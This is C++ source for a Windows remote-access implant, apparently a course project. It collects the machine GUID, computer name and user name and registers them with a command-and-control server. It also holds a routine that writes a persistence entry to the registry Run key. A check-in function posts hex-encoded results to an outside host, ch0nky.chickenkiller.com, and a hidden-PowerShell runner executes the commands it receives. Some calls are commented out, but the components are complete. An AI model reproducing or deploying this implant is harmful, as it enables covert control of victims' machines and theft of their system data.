#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>
#include <sstream>
#include <string.h>
#include "httpClient.cpp"
#include "winhash.cpp"
#include "steganography.cpp"
#define BUF_SIZE 4096 
#define UNLEN 256

inline bool file_exists (std::string &name, std::string hash) {
    if (FILE *file = fopen(name.c_str(), "r")) {
        char buffer[BUF_SIZE];
        size_t out_size;

        // read the data from the file and get its hash
        out_size = fread(buffer, 1, SEEK_END, file);

        // make the hash object
        auto sha256 = new WinHash((LPCWSTR) BCRYPT_SHA256_ALGORITHM);

        sha256->Update( (BYTE*) buffer, out_size);
        //sha256->Update( (BYTE*) test, size);
        sha256->Digest();

        // wprintf(L"Printing the hash!\n");
        // for(DWORD i=0; i < sha256->cbHash; i++){
        //     wprintf(L"%02x", sha256->pbHash[i]);
        // }
        std::string file_hash((char*) (sha256->pbHash), sha256->cbHash);
        // wprintf(L"\n");

        // make sure to delete the sha256 value that we created.
        delete  sha256;


        fclose(file);
        return strcmp(file_hash.c_str(), hash.c_str());
    } 
    else {
        return false;
    }   
}

// Convert string of chars to its representative string of hex numbers
void stream2hex(const std::string str, std::string& hexstr, bool capital = false)
{
    hexstr.resize(str.size() * 2);
    const size_t a = capital ? 'A' - 1 : 'a' - 1;

    for (size_t i = 0, c = str[0] & 0xFF; i < hexstr.size(); c = str[i / 2] & 0xFF)
    {
        hexstr[i++] = c > 0x9F ? (c / 16 - 9) | a : c / 16 | '0';
        hexstr[i++] = (c & 0xF) > 9 ? (c % 16 - 9) | a : c % 16 | '0';
    }
}

// sourced and modified from Lecture 7 code.
std::string execute_shell(wchar_t* command) {
    // WCHAR cmd[] = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    WCHAR* cmdLine = command;
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    std::string output = "";

    // we only need one handle for writing 
    // handle for reading, handle for writing 
    HANDLE hStdOutRd, hStdOutWr;
    // HANDLE hStdErrRd, hStdErrWr;

    //Create one-way pipe for child process STDOUT
    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0))
    {
    // error handling...
    return output;
    }

    // Ensure that the child proecsses does not inherit the read handle
    SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
    

    STARTUPINFO si = {0};
    ZeroMemory( &si, sizeof(STARTUPINFO) );

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    // we pipe stdOut and StdErr to the same pipe
    si.hStdOutput = hStdOutWr;
    si.hStdError = hStdOutWr;

    PROCESS_INFORMATION pi = {0};
    ZeroMemory( &pi, sizeof(PROCESS_INFORMATION) );
    // create the process 
    // printf("**************************TEST**********************************\n");
    if (!CreateProcessW
        (NULL,
        cmdLine, // Command line
        NULL, // process security attributes
        NULL,  // primay thread security attributes
        TRUE,  // Handles are inerited
        CREATE_NO_WINDOW,  // creation flags
        NULL, // use parents env
        NULL,  // use parents cwd
        &si, // points to STARTUPINFO
        &pi) // recieves PROCESS_INFORMATION
     )
    {
        printf("Error Creating Process: %ld\n", GetLastError());
        return output;
        // error handling...
    }
    else
    {
        bool bProcessEnded = false;
        DWORD dwRead;
        CHAR chBuf[BUF_SIZE];
        BOOL bSuccess = FALSE;
        DWORD dwAvail = 0;
        for (; !bProcessEnded;){
            bProcessEnded = ::WaitForSingleObject( pi.hProcess, 50) == WAIT_OBJECT_0;
            // read from hStdOutRd and hStdErrRd as needed until the process is terminated...
            
                for (;;){
                    if (!::PeekNamedPipe(hStdOutRd, NULL, 0, NULL, &dwAvail, NULL))
                        break;

                    if (!dwAvail) // No data available, return
                        break;
                    bSuccess = ::ReadFile(hStdOutRd, chBuf, BUF_SIZE-1, &dwRead, NULL) ||  !dwRead;
                    if( ! bSuccess || dwRead ==0) break;
                    // chBuf[dwRead] = '\n';
                    chBuf[dwRead] = '\0';
                    // printf("%s",chBuf);
                    output.append(chBuf);

                }

        }
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);
    }

    ::CloseHandle(hStdOutRd);
    ::CloseHandle(hStdOutWr);
    // std::cout << "**************************OUTPUT*******************************" << std::endl;
    // std::cout << output << std::endl;
    // std::cout << "**************************OUTPUT*******************************" << std::endl;
    return output;
}

int set_run_key() {
    // printf("Start of reg key function....\n");
    LPSTR filepath[260];
    GetModuleFileNameA(NULL, (LPSTR)filepath, 260);
    // printf("After get module file name....\n");

    LPSTR lpData[260];

    strcpy((char*) lpData, "\"");
    strcat((char*) lpData, (char*) filepath);
    strcat((char*) lpData, "\"");

    // printf("%s\n", (char*)lpData);
    // printf("String Length: %d\n", strlen((char*)lpData));
    


    // set HKEY handle and open the key
    HKEY regKey = (HKEY)0x0;
    RegOpenKeyExA((HKEY)HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 0xf003f, &regKey);

    // set registry value
    LSTATUS lStatus = RegSetValueExA(regKey, "ch0nk", 0, REG_SZ, (BYTE *) lpData, (DWORD) strlen((char*)lpData) );
    if (lStatus != 0){
        printf("****************Error %ld\n", lStatus);
        RegCloseKey(regKey);
        return -1;
    }
    
    // close key handle
    RegCloseKey(regKey);

    return 0;
}

std::string get_guid() {
     // set HKEY handle and open the key
    BYTE lpData[255];
    DWORD cbData = 255;

    HKEY regKey = (HKEY)0x0;
    RegOpenKeyExA((HKEY)HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, 0x20119, &regKey);

    // set registry value
    RegQueryValueExA(regKey,"MachineGuid",(LPDWORD)0x0,(LPDWORD)0x0, lpData, &cbData);
    
    // close key handle
    RegCloseKey(regKey);

    std::string guid((char*) lpData, (int) cbData);

    return guid;
}

std::string register_implant(char* compName, char* userName) {
    // Make each section of the header separately, then concat together
    std::wcout << L"********** START OF REGISTER FUNCTION ***********" << std::endl;

    std::string header = "auth=d50fb4bbb04a6a28ec1c56ecbc463510";
    std::string guid = "&guid=";
    std::string guid_temp = get_guid();
    guid.append(guid_temp.c_str());

    std::string user = "&user=";
    user.append(userName);

    std::string computer = "&computer=";
    computer.append(compName);

    header.append(guid).append(user).append(computer);
    wprintf(L"header = %s\n", header.c_str());

    // wprintf(L"header length = %d\n", strlen(header));
    // std::stringstream hex_header;
    std::string hex_data = "hex=";

    stream2hex(header, header);
    hex_data.append(header);
    // std::wcout << hex_data << std::endl;
    std::string http_data(hex_data.begin(), hex_data.end());
    // wprintf(L"hex data= %s\n", hex_data.c_str());

    // construct the optional headers
    
    // std::wstring http_optional_headers = L"Authorization: " + std::wstring(guid_temp.begin(), guid_temp.end()-1) + L"\r\n";
    std::wstring http_optional_headers = L"Authorization: Bobobo";
    // http_optional_headers.append(L"Content-Type: application/x-www-form-urlencoded\r\n");
    // std::wcout << L"http_optional_headers = " << http_optional_headers << std::endl;

    // construct the uri string
    std::wstring uri = L"/commands";

    // construct the url
    std::wstring fqdn = L"localhost";

    // construct the http method
    std::wstring http_method = L"POST";

    // std::wcout << L"Before http request" << std::endl;

    std::string output = makeHttpRequest(
        fqdn,
        5000,
        uri,
        0,
        http_optional_headers,
        http_method,
        http_data
    );

    // std::wcout << L"Last error for makeHttpRequest = " << GetLastError() << std::endl;

    // std::wcout << L"After http request" << std::endl;

    return output;
}

std::string checkin_implant(std::string response) {
    // Make each section of the header separately, then concat together
    std::wcout << L"********** START OF CHECK-IN FUNCTION" << std::endl;

    std::string guid_temp = get_guid();

    // wprintf(L"header length = %d\n", strlen(header));
    // std::stringstream hex_header;
    std::string hex_data = "hex=";

    // convert the response string to hex before sending
    // std::stringstream temp_sstream;
    // for (int i=0; i < strlen(response.c_str()); i++){
    //     std::cout << (response.c_str()[i]);
    //     temp_sstream << std::hex << (int) (response.c_str()[i]);
    // }
    // std::string hex = temp_sstream.str();
    stream2hex(response, response);

    hex_data.append(response);
    // std::cout << "**************************HEX DATA*******************************" << std::endl;
    // std::cout << hex_data << std::endl;
    // std::cout << "**************************HEX DATA*******************************" << std::endl;
    std::string http_data(hex_data.begin(), hex_data.end());
    // wprintf(L"hex data= %s\n", hex_data.c_str());

    // construct the optional headers
    
    std::wstring http_optional_headers = L"Authorization: " + std::wstring(guid_temp.begin(), guid_temp.end()-1) + L"\r\n";
    http_optional_headers.append(L"Content-Type: application/x-www-form-urlencoded\r\n");
    // std::wcout << L"http_optional_headers = " << http_optional_headers << std::endl;

    // construct the uri string
    std::wstring uri = L"/checkin.php";

    // construct the url
    std::wstring fqdn = L"ch0nky.chickenkiller.com";

    // construct the http method
    std::wstring http_method = L"POST";

    // std::wcout << L"Before http request" << std::endl;

    std::string output = makeHttpRequest(
        fqdn,
        443,
        uri,
        1,
        http_optional_headers,
        http_method,
        http_data
    );

    // std::wcout << L"Last error for makeHttpRequest = " << GetLastError() << std::endl;

    // std::wcout << L"After http request" << std::endl;

    return output;
}


int wmain() {

    // TODO: UNCOMMENT FREE CONSOLE FOR FINAL PROGRAM!
    // FreeConsole();
    std::string filename = "C:\\malware\\ch0nky.txt";
    std::string hash = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855";
    // checks for the "ch0nky.txt file"
    // if (!file_exists(filename, hash)){
    //     return -1;
    // }
    // printf("ch0nky.txt exists: %s\n", file_exists(filename, hash) ? "true" : "false");



    // grab the guid
    std::string guid = get_guid();
    printf("Guid: %s\n", guid.c_str());

    // grab the computer name
    char compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD maxCompNameLength = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(compName, &maxCompNameLength );
    // printf("Computer Name: %s\n", compName);

    // grab the user name
    char userName[UNLEN + 1];
    DWORD maxUserNameLength = UNLEN + 1;
    GetUserNameA(userName, &maxUserNameLength );
    // printf("User Name: %s\n", userName);

    // TODO right before registering. 
    Sleep(1000);
    // set_run_key();

    std::string output = "";

    // attempt to register with the c2
    do {
        if (strcmp("OK", output.c_str()) == 0){
            std::wcout << L"BROKEN OUT OF FIRST DO WHILE" << std::endl;
            break;
        }
        
        output = register_implant(compName, userName);
        // std::cout << "\n \n \n" << std::endl;
        // std::cout << output << std::endl;
        Sleep(1000);
    } while(true);


    // get responses to the server and constantly check in every minute for commands
    std::string response = "";

    // while (true) {
    //     Sleep(5000);
    //     std::string c2_command = "";

    //     c2_command = checkin_implant(response);
    //     response = "";    

    //     std::string command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /c ";
    //     command.append(c2_command);
    //     std::wstring command_temp(command.begin(), command.end());
    //     wchar_t* wCommand = (wchar_t*) command_temp.c_str();

    //     // std::wcout << wCommand << std::endl;

    //     response = execute_shell(wCommand);
    // }

    return -1;
}